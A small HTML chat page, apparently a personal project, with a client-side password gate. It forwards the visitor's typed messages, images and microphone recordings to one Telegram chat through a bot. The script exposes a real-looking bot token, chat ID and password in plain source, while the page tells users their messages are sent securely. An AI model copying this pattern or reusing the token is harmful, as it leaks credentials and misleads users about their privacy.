<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Space | TG Edition</title>
    <style>
        :root { --bg: #1a1a1a; --primary: #0088cc; --text: #ffffff; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; height: 100vh; }
        
        /* شاشة الدخول */
        #login-screen { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 100; }
        .login-card { background: #222; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid var(--primary); }
        input[type="password"] { background: #333; border: none; padding: 12px; border-radius: 8px; color: white; text-align: center; font-size: 18px; outline: none; }

        /* واجهة الشات */
        #chat-screen { display: none; width: 100%; max-width: 500px; flex-direction: column; background: #242424; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .msg { background: #333; padding: 10px; border-radius: 10px; align-self: flex-end; max-width: 80%; }
        
        .input-bar { padding: 15px; background: #1a1a1a; display: flex; align-items: center; gap: 10px; }
        input[type="text"] { flex: 1; background: #333; border: none; padding: 10px; border-radius: 5px; color: white; outline: none; }
        .btn { cursor: pointer; color: var(--primary); background: none; border: none; font-size: 20px; }
        .recording { color: red; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="login-card">
            <h2>خصوصيتنا يا حببتي🔒</h2>
            <input type="password" id="passCode" placeholder="كلمة السر">
            <br><br>
            <button onclick="checkAccess()" style="background:var(--primary); color:white; border:none; padding:10px 30px; border-radius:5px; cursor:pointer;">دخول</button>
        </div>
    </div>

    <div id="chat-screen">
        <div id="messages">
            <div class="msg">أهلاً بيك في مساحتك الخاصة.. الرسايل هنا بتتبعت بأمان.</div>
        </div>
        <div class="input-bar">
            <input type="file" id="fileInput" hidden onchange="sendFile(this.files[0])">
            <button class="btn" onclick="document.getElementById('fileInput').click()">🖼️</button>
            <input type="text" id="textMsg" placeholder="اكتب رسالتك...">
            <button class="btn" id="micBtn">🎤</button>
            <button class="btn" onclick="sendText()">🚀</button>
        </div>
    </div>

    <script>
        const TG_TOKEN = '8359300970:AAG7QONQpwSKK2YBjOzLCZJA8Ovoehkdnjs'; // حط توكن البوت هنا
        const CHAT_ID = '8517305948';   // حط ID الشات هنا

        function checkAccess() {
            if(document.getElementById('passCode').value === '3117') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('chat-screen').style.display = 'flex';
            } else { alert('الباسورد غلط!'); }
        }

        // إرسال نص لتليجرام
        async function sendText() {
            const text = document.getElementById('textMsg').value;
            if(!text) return;
            
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
            addLocalMessage(text);
            document.getElementById('textMsg').value = '';
        }

        // إرسال صورة أو ريكورد لتليجرام
        async function sendFile(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            let method = 'sendPhoto';
            if (file.type.includes('image')) {
                formData.append('photo', file);
            } else {
                method = 'sendAudio';
                formData.append('audio', file);
            }

            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, {
                method: 'POST',
                body: formData
            });
            addLocalMessage("تم إرسال الملف بنجاح ✅");
        }

        function addLocalMessage(txt) {
            const div = document.createElement('div');
            div.className = 'msg';
            div.innerText = txt;
            document.getElementById('messages').appendChild(div);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        }

        // كود التسجيل (نفس المنطق السابق)
        let mediaRecorder;
        let chunks = [];
        document.getElementById('micBtn').onclick = async () => {
            if (!mediaRecorder || mediaRecorder.state === "inactive") {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    sendFile(new File([blob], "voice.ogg"));
                    chunks = [];
                };
                mediaRecorder.start();
                document.getElementById('micBtn').classList.add('recording');
            } else {
                mediaRecorder.stop();
                document.getElementById('micBtn').classList.remove('recording');
            }
        };
    </script>
</body>
</html>
